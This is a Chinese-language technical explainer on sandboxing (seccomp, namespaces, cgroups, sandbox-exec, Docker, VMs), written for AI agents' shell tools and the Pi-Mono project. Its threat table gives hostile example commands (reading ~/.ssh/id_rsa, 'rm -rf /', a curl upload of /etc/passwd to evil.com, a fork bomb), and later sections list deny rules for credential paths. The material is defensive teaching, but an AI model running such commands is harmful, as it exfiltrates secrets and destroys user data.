# Sandbox 第一性原理拆解

## 1. 本质：受控的隔离执行环境

Sandbox（沙箱）的本质是一个**对程序行为施加约束的隔离边界**。核心思想：

> **让代码在一个"假的"或"受限的"世界里运行，使其无法影响真实世界。**

Sandbox 不是一种具体技术，而是一种**架构模式**（pattern）——在不可信代码和真实系统之间建立一个可控的、可丢弃的执行边界。

---

## 2. 为什么需要 Sandbox？

当你运行一段不完全可信的代码（比如 AI 生成的 shell 命令），它可能：

| 威胁 | 例子 |
|---|---|
| 读取敏感数据 | `cat ~/.ssh/id_rsa`、读取环境变量中的 API Key |
| 篡改/删除文件 | `rm -rf /`、修改 `~/.bashrc` 植入后门 |
| 网络外传 | `curl https://evil.com -d @/etc/passwd` |
| 提权/持久化 | 安装 crontab、修改系统配置 |
| 资源耗尽 | fork bomb `:(){ :|:& };:`、吃满磁盘 |

如果没有 sandbox，给 AI 的 shell 工具等于 root 权限的后门。

---

## 3. 核心机制：三个维度

所有程序想做"有意义"的事都必须通过**系统调用（syscall）**请求内核代劳，这是唯一的出口：

```
用户程序 → syscall → 内核 → 硬件
```

所有沙箱技术本质上都是在这条链路上的某个位置"卡一道关"。三个维度：

### 3.1 文件系统隔离

让进程看到的文件系统树不是真实的。

- **chroot**：改变进程的根目录 `/`，使其无法访问 chroot 目录之外的文件（1979 年 Unix V7）
- **Mount Namespace**（Linux）：每个 namespace 有自己的挂载点表
- **Overlay FS**：在只读的真实文件系统上叠加一层可写层。Docker 就是这么做的

效果：`rm -rf /` 只会删掉沙箱里的文件，真实系统毫发无损。

### 3.2 系统调用过滤

在 syscall 入口处拦截和过滤，精确控制程序行为。

- **seccomp-bpf**（Linux）：在内核中安装一个 BPF 程序，每次 syscall 前执行，决定允许/拒绝/终止。Chrome 浏览器的渲染进程就用这个
- **AppArmor / SELinux**：基于 MAC（强制访问控制）策略
- **macOS Sandbox (Seatbelt)**：`sandbox-exec` 使用 SBPL 定义策略，Darwin 内核在 syscall 层强制执行

效果：即使 shell 命令尝试 `connect()` 到外部 IP，内核直接返回 `EPERM`。

### 3.3 资源限制

即使隔离了访问范围，进程仍可通过耗尽 CPU/内存/磁盘来搞 DoS。

- **cgroups**（Linux）：对一组进程的 CPU、内存、IO 带宽设上限
- **rlimit**：限制单个进程的最大文件描述符数、进程数、栈大小等
- **Network Namespace**：给进程一个独立的网络栈，可以不配任何网卡，直接断网

---

## 4. 沙箱 vs 策略门控——关键区别

> **沙箱限制的是"代码执行时的能力"，策略门控限制的是"能不能调用"。**

| | 沙箱 (Sandbox) | 策略门控 (Policy Gate) |
|---|---|---|
| **作用点** | 代码**执行时** | 代码**执行前** |
| **原理** | 让代码在受限环境中运行，即使它"尝试"做坏事也做不到 | 在执行前检查，决定"允不允许执行" |
| **绕过难度** | 极难（内核/硬件级强制） | 可被绕过（正则匹配 `rm -rf` 但检测不到 `rm -r -f`、`find -delete`） |
| **类比** | 把人关在一个没有刀的房间里 | 在门口检查人有没有带刀 |

从弱到强，安全手段构成一个光谱：

```
弱 ◄─────────────────────────────────────────────────► 强

正则过滤        策略门控        进程级沙箱      容器       VM
(permission-   (tool_call     (seccomp/       (Docker)   (Firecracker)
 gate.ts)       block)        sandbox-exec)

 ← 不算沙箱 →   ← 边界 →      ← ──── 沙箱 ────────── →
```

---

## 5. sandbox-exec（macOS Seatbelt）详解

### 是什么

macOS 内置的沙箱工具，底层是 Darwin 内核的 **TrustedBSD MAC 框架**（Mandatory Access Control）。每个 Mac App Store 应用都运行在这套机制下。

### 工作原理

1. 启动进程时，通过 `sandbox-exec -f profile.sb` 附加一个 sandbox profile（用 Scheme 方言 SBPL 编写）
2. 内核在**每个 syscall 入口处**检查该进程的 profile
3. 不匹配策略的 syscall 直接被内核拒绝，返回权限错误

示例 profile：

```scheme
(version 1)
;; 默认拒绝一切
(deny default)
;; 允许执行进程
(allow process-exec)
(allow process-fork)
;; 只允许读取 /usr 和 /tmp
(allow file-read*
    (subpath "/usr")
    (subpath "/tmp"))
;; 只允许写入 /tmp
(allow file-write*
    (subpath "/tmp"))
;; 禁止所有网络
(deny network*)
```

### 为什么无法绕过

检查发生在**内核态**。用户态程序不管用什么语言、什么技巧调用 `open()`、`connect()`，最终都得走 syscall，而 syscall 入口被内核拦截了。除非有内核漏洞，否则无路可走。

### 作用范围

sandbox-exec 是一个命令行工具，它启动一个子进程并给这个子进程附加沙箱策略。它**不影响宿主机上的其他进程，也不影响父进程**。

```
pi 进程（无沙箱）
  └── sandbox-exec -f profile.sb sh -c "npm install"（有沙箱）
        ├── sh（继承沙箱）
        │     └── npm（继承沙箱）
        │           └── node（继承沙箱）
        │                 └── 任何子进程（继承沙箱，且无法解除）
        └── 命令结束，进程退出，沙箱随之消失
```

关键特性：
- 策略通过内核的 MAC 框架绑定在**进程描述符**上
- 被 `fork()`/`exec()` 的子进程**继承**策略
- **只能更严格不能放松**——子进程无法调用任何 API 来移除自己身上的沙箱限制

---

## 6. Docker 怎么实现沙箱

Docker 不是一个单一技术，而是组合了 Linux 内核的三种机制：

### 6.1 Namespace（命名空间）—— "让进程看到假的世界"

给进程一个隔离的视图，进程以为自己看到了整个系统，实际上看到的只是一个切片。

| Namespace 类型 | 隔离什么 | 效果 |
|---|---|---|
| **Mount** | 文件系统挂载表 | 容器看到的 `/` 是自己的，不是宿主机的 |
| **PID** | 进程 ID 空间 | 容器内 `ps aux` 只看到自己的进程 |
| **Network** | 网络栈 | 容器有自己的 IP、端口、路由表 |
| **UTS** | 主机名 | 容器有自己的 hostname |
| **User** | 用户/组 ID | 容器内的 root 映射到宿主机的普通用户 |
| **IPC** | 进程间通信 | 容器间的共享内存、信号量隔离 |

具体怎么做的：`clone()` 系统调用加 `CLONE_NEWNS | CLONE_NEWPID | CLONE_NEWNET` 等标志创建新进程。这个进程从出生起就活在一个隔离的命名空间里。

### 6.2 cgroups（控制组）—— "限制进程能用多少资源"

Namespace 解决了"能看到什么"的问题，cgroups 解决"能用多少"的问题：

```
cgroups 限制:
├── CPU: 最多使用 1 个核心
├── 内存: 最多 512MB，超了直接 OOM kill
├── 磁盘 IO: 读写带宽上限 100MB/s
├── PID 数: 最多 100 个进程（防 fork bomb）
└── 网络带宽: 可限速
```

具体怎么做的：内核通过 `/sys/fs/cgroup/` 虚拟文件系统暴露控制接口。Docker 创建容器时在 cgroup 目录下建一个新的子组，写入限制值，然后把容器进程的 PID 加进去。

### 6.3 seccomp-bpf —— "过滤危险的系统调用"

Docker 默认为容器启用 seccomp 过滤器，禁用约 44 个危险 syscall：

```
禁用的 syscall 包括：
├── mount / umount     （不能挂载文件系统）
├── reboot             （不能重启宿主机）
├── kexec_load         （不能加载新内核）
├── ptrace             （不能调试/注入其他进程）
├── bpf                （不能加载 BPF 程序）
├── unshare            （不能创建新的 namespace 逃逸）
└── ...
```

### 三者组合效果

`rm -rf /` 在 Docker 容器里执行：
1. **Namespace** 让它看到的 `/` 是容器自己的 overlay 文件系统，不是宿主机的
2. **cgroups** 限制它不能用超额资源来搞 DoS
3. **seccomp** 阻止它用 `mount`/`ptrace` 等 syscall 逃逸

### 实际 Docker 沙箱命令示例

```bash
docker run --rm \
  --network none \                    # 断网
  --read-only \                       # 根文件系统只读
  --tmpfs /tmp:size=100m \            # 临时可写区，限100MB
  --memory 512m --cpus 1 \            # 资源限制
  --security-opt no-new-privileges \  # 禁止提权
  --cap-drop ALL \                    # 丢弃所有 Linux capabilities
  -v /project:/workspace:ro \         # 项目目录只读挂载
  -w /workspace \
  ubuntu:22.04 \
  sh -c "grep -r 'TODO' ."           # AI 生成的命令在这里执行
```

---

## 7. 各层沙箱技术对比

```
用户程序
  │
  │ ① sandbox-exec: 在 syscall 入口处用 MAC 策略过滤
  │ ② seccomp-bpf (Docker 的一部分): 在 syscall 入口处用 BPF 程序过滤
  ▼
syscall 接口
  │
  │ ③ Namespace (Docker 的一部分): 让 syscall 操作的对象是隔离的副本
  ▼
内核
  │
  │ ④ cgroups (Docker 的一部分): 限制内核分配给进程的资源量
  ▼
硬件
  │
  │ ⑤ VM (Firecracker): 在硬件虚拟化层面隔离，完全独立的内核
  ▼
物理资源
```

| 技术 | 卡关位置 | 隔离强度 | 开销 |
|---|---|---|---|
| sandbox-exec | syscall 入口（MAC） | 中 | 极低 |
| seccomp-bpf | syscall 入口（BPF） | 中 | 极低 |
| Namespace | 内核对象视图 | 中高 | 低 |
| cgroups | 资源分配 | 补充 | 低 |
| Docker（组合） | 以上三者 | 中高 | 低 |
| VM | 硬件虚拟化 | 最高 | 中 |

常见方案从轻到重：

| 方案 | 隔离强度 | 原理 | 典型使用 |
|---|---|---|---|
| rlimit + seccomp | 低 | 仅过滤 syscall | 单个不可信函数 |
| chroot + seccomp | 中低 | 文件系统隔离 + syscall 过滤 | 传统 FTP 服务器 |
| Linux Namespace + cgroups | 中高 | 即"容器"的本质 | Docker, Podman |
| microVM | 高 | 一个轻量虚拟机 | Firecracker (AWS Lambda), gVisor |
| 完整 VM | 最高 | 完全独立的内核 | VirtualBox, QEMU/KVM |

> 注意：容器不是 VM。容器共享宿主内核，隔离靠 namespace + cgroups；VM 有自己的内核，隔离靠硬件虚拟化。容器的隔离"天花板"比 VM 低。

---

## 8. 为什么 AI Agent 的 Shell 工具必须在 Sandbox 里运行

1. **LLM 输出不可信**：模型可能被 prompt injection 攻击，或者自己"幻觉"出危险命令
2. **Shell 是万能的攻击面**：shell 不是一个受限的 API，它是操作系统的完整接口
3. **Sandbox 是最小权限原则的落地**：只挂载项目目录、禁止网络、限制资源、禁止危险 syscall
4. **出了问题可恢复**：sandbox 是一次性的，执行完毕后可写层直接丢弃

---

## 9. Pi-Mono 项目中的 Sandbox 机制

Pi-Mono 的设计哲学是**安全机制全部可选/可插拔**，非内置强制。共有三层 sandbox + 一层策略门控：

### 9.1 Mom Docker 沙箱（内置）

**位置**: `packages/mom/src/sandbox.ts` + `packages/mom/docker.sh`

Mom（Slack bot agent）支持将所有工具执行路由到 Docker 容器内：

```bash
mom --sandbox=docker:mom-sandbox ./data
```

- `HostExecutor`：直接在宿主机 `spawn(sh, ["-c", cmd])`
- `DockerExecutor`：封装为 `docker exec <container> sh -c <cmd>`
- 默认是 `host` 模式（无隔离），需要用户显式指定

### 9.2 Coding Agent OS 级沙箱（示例扩展，非默认加载）

**位置**: `packages/coding-agent/examples/extensions/sandbox/index.ts`

使用 `@anthropic-ai/sandbox-runtime` 包：
- macOS: `sandbox-exec`
- Linux: `bubblewrap`

默认策略：
- 网络白名单：仅允许 `npmjs.org`、`github.com`、`pypi.org` 等
- 禁止读取：`~/.ssh`、`~/.aws`、`~/.gnupg`
- 仅允许写入：`.`（当前目录）和 `/tmp`
- 禁止写入：`.env`、`*.pem`、`*.key`

需要用 `pi -e ./sandbox` 显式启用，可通过 `--no-sandbox` 禁用。

### 9.3 Web UI 浏览器沙箱（内置）

**位置**: `packages/web-ui/src/components/SandboxedIframe.ts`

用 iframe sandbox 属性隔离 AI 生成的 HTML/JS 代码：
- 仅 `allow-scripts` + `allow-modals`（无 `allow-same-origin`、无 `allow-top-navigation`）
- 拦截所有链接点击/表单提交
- 120 秒执行超时

### 9.4 工具拦截框架（内置框架，扩展填充策略）

**位置**: `packages/agent/src/agent-loop.ts` 的 `beforeToolCall` 钩子 + `packages/coding-agent/src/core/extensions/runner.ts` 的 `tool_call` 事件

这是**策略门控**（不是沙箱），但与沙箱互补：
- `permission-gate.ts`：检测 `rm -rf`、`sudo`、`chmod 777`
- `protected-paths.ts`：阻止写入 `.env`、`.git/`、`node_modules/`
- `tool-override.ts`：审计日志 + 阻止读取 `.ssh/`、`.aws/`

### 9.5 总结

| 维度 | 状态 |
|---|---|
| Coding Agent bash 默认隔离 | **无** |
| Mom bash Docker 隔离 | 可选（`--sandbox=docker:name`） |
| OS 级沙箱（sandbox-exec/bubblewrap） | 可选扩展 |
| 浏览器代码执行隔离 | **内置**（iframe sandbox） |
| 工具拦截/门控框架 | **内置框架**，策略由扩展提供 |
| 全局命令黑白名单 | **无** |

Pi-Mono 的理念：**框架提供可插拔的安全接口（`BashOperations`、`beforeToolCall`、`tool_call` 事件），具体安全策略由用户按需通过扩展实现。** 门卫（策略门控）决定放不放行，围墙（沙箱）限制放行后能做什么，二者互补不可替代。
